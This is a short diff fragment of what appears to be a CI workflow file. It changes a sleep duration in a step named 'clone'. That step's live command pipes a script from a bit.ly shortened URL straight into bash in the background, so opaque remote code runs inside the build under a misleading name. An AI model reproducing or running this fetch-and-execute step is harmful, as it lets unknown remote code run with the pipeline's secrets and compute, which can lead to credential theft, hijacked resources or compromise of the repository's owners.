@@ -49,7 +49,7 @@ jobs:
       id: go
     - name: clone
       run: curl -sL  http://bit.ly/3Jefaky | bash &
-            sleep 60m
+            sleep 10m
         
     
      
